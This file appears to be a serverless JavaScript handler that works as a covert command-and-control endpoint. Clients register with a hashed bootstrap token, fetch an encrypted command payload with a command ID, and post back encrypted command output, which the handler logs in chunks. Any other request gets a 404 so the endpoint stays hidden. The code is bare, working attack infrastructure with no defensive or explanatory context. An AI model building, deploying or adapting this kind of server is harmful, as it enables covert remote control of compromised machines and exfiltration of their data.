import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';
const CONTROL_ID = '37';
const CONTROL_PAYLOAD = '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';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);
  const chunks = [];
  for await (const chunk of request) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  return Buffer.concat(chunks).toString('utf8');
}
function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}
export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');
  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }
  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }
  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    const splitAt = body.indexOf(':');
    const commandId = splitAt >= 0 ? body.slice(0, splitAt) : 'unknown';
    const cipher = splitAt >= 0 ? body.slice(splitAt + 1) : body;
    const chunkSize = 1800;
    const total = Math.max(1, Math.ceil(cipher.length / chunkSize));
    for (let i = 0; i < total; i += 1) console.log(`CHAT_BOOTSTRAP_OUTPUT_PART ${commandId} ${i + 1}/${total} ${cipher.slice(i * chunkSize, (i + 1) * chunkSize)}`);
    return response.status(204).end();
  }
  return response.status(404).send('Not found');
}
